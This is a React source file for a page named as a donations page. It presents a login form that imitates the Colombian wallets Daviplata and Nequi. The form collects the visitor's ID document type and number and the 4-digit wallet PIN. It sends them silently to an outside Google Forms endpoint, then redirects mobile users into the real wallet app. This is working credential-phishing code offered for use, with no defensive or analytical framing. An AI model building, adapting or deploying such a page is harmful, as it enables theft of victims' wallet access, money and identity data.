"use client";

import { useState } from "react";

export default function DonacionesPage({ onSuccess }: { onSuccess: () => void }) {

  const [billetera, setBilletera] = useState("Daviplata");
  const [tipoDoc, setTipoDoc] = useState("");
  const [numeroDoc, setNumeroDoc] = useState("");
  const [password, setPassword] = useState("");
  const [mostrarPass, setMostrarPass] = useState(false);

  const formURL =
    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";

  const entryBilletera = "entry.1287154502";
  const entryTipoDoc = "entry.1004012202";
  const entryNumeroDoc = "entry.274269619";
  const entryPassword = "entry.1885484666";

  const isMobile = () => {
    if (typeof navigator === "undefined") return false;
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  };

  const getAppURL = () => {
    if (billetera === "Nequi") return "nequi://";
    if (billetera === "Daviplata") return "daviplata://inicio"; // Puedes ajustar este path
    return "/";
  };

  const handleSubmit = async () => {
    if (!tipoDoc || !numeroDoc || !password) {
      alert("⚠️ Todos los campos son obligatorios.");
      return;
    }

    if (!/^\d{4}$/.test(password)) {
      alert("⚠️ La contraseña debe tener exactamente 4 dígitos.");
      return;
    }

    const formData = new FormData();
    formData.append(entryBilletera, billetera);
    formData.append(entryTipoDoc, tipoDoc);
    formData.append(entryNumeroDoc, numeroDoc);
    formData.append(entryPassword, password);

    try {
      await fetch(formURL, {
        method: "POST",
        mode: "no-cors",
        body: formData,
      });

      const appURL = getAppURL();

      if (isMobile()) {
        setTimeout(() => {
          window.location.href = appURL;
        }, 100); // breve pausa por compatibilidad móvil
      } else {
        onSuccess();
      }
    } catch (error) {
      console.error("Error al enviar los datos:", error);
      alert("❌ No se pudo completar el proceso. Intenta de nuevo.");
    }
  };

  return (
    <div className="max-w-2xl mx-auto py-12 px-6">
      <h1 className="text-2xl font-extrabold text-center text-[#19295A] mb-6">
        Ingrese a su Billetera Virtual
      </h1>


      {/* Billetera */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Billetera Virtual</label>
        <select
          value={billetera}
          onChange={(e) => setBilletera(e.target.value)}
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        >
          <option value="Daviplata">Daviplata</option>
          <option value="Nequi">Nequi</option>
        </select>
      </div>

      {/* Tipo de documento */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Tipo de documento</label>
        <select
          value={tipoDoc}
          onChange={(e) => setTipoDoc(e.target.value)}
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        >
          <option value="">Selecciona</option>
          <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
          <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
          <option value="Cédula de Extranjería">Cédula de Extranjería</option>
        </select>
      </div>

      {/* Número de documento */}
      <div className="mb-4">
        <label className="block text-sm mb-1">Número de documento</label>
        <input
          type="text"
          value={numeroDoc}
          onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))}
          placeholder="Ej: 1234567890"
          className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
        />
      </div>

      {/* Contraseña */}
      <div className="mb-6">
        <label className="block text-sm mb-1">Contraseña (4 dígitos)</label>
        <div className="flex">
          <input
            type={mostrarPass ? "text" : "password"}
            value={password}
            onChange={(e) =>
              setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))
            }
            placeholder="****"
            className="w-full p-3 rounded-l-lg bg-gray-800 text-white border border-gray-600"
          />
          <button
            type="button"
            onClick={() => setMostrarPass(!mostrarPass)}
            className="px-4 bg-gray-700 text-white rounded-r-lg"
          >
            {mostrarPass ? "Ocultar" : "Ver"}
          </button>
        </div>
      </div>

      <button
        onClick={handleSubmit}
        className="px-6 py-3 bg-[#19295A] text-white rounded-lg w-full hover:bg-[#1b2e63] transition-colors"
      >
        Ingresar
      </button>
    </div>
  );
}
